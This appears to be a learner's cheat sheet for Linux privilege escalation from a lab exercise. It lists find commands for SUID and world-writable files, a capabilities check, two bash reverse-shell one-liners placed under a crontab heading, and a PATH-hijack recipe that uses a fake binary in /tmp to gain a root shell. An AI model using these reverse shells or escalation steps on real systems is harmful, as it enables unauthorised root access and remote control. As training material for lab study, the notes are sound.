Find files:

    find . -name flag1.txt -type f 2>/dev/null : find the file named “flag1.txt” in the current directory
    find /home -name flag1.txt -type f 2>/dev/null : find the file names “flag1.txt” in the /home directory
    find / -type d -name config -type f 2>/dev/null : find the directory named config under “/”
    find / -type f -perm 0777 -type f 2>/dev/null : find files with the 777 permissions (files readable, writable, and executable by all users)
    find / -perm a=x -type f 2>/dev/null : find executable files
    find /home -user frank -type f 2>/dev/null : find all files for user “frank” under “/home”
    find / -mtime 10 -type f 2>/dev/null : find files that were modified in the last 10 days
    find / -atime 10 -type f 2>/dev/null : find files that were accessed in the last 10 day
    find / -cmin -60 -type f 2>/dev/null : find files changed within the last hour (60 minutes)
    find / -amin -60 -type f 2>/dev/null : find files accesses within the last hour (60 minutes)
    find / -size 50M -type f 2>/dev/null : find files with a 50 MB size

Folders and files that can be written to or executed from:

    find / -writable -type d 2>/dev/null : Find world-writeable folders
    find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
    find / -perm -o w -type d 2>/dev/null: Find world-writeable folders
    find / -perm -o x -type d 2>/dev/null: Find world-executable folders

Find development tools and supported languages:

    find / -name perl*
    find / -name python*
    find / -name gcc*

Find specific file permissions: 
SUID bit

    find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 


find / -type f -perm -04000 -ls 2>/dev/null : will list files that have SUID or SGID bits set.

find / -writable 2>/dev/null

writable subfolders 

find / -writable 2>/dev/null | grep usr |cut -d "/" -f 2,3 | sort -u

to get rid of the many results related to running processes.

find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

Capabilities

increase the privilege level of a process or binary 

getcap -r / 2>/dev/null

use gtfobins



/etc/crontab

#!/bin/bash

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
or
bash -c 'exec bash -i &>/dev/tcp/192.168.45.164/1234 <&1'


echo $PATH

if we have a path that looks like this 

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

if we type thm in the comman like this are the folders/locations linux will look in for the exucutable called thm

if there is a script that has the SUID bit and launch a system binary called 'thm' 
we could create a binary named thm in a writable folder under PATH if none is writable we add one (/tmp) path” script run it. As the SUID bit it will be run as the root privilege

find / -writable 2>/dev/null | grep usr |cut -d "/" -f 2,3 | sort -u
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

export PATH=/tmp:$PATH
echo $PATH

now the path script will also look under the /tmp folder for an executable named “thm”. 

cd /tmp
echo "/bin/bash" > thm
chmod 777 thm
ls -la

./run the script
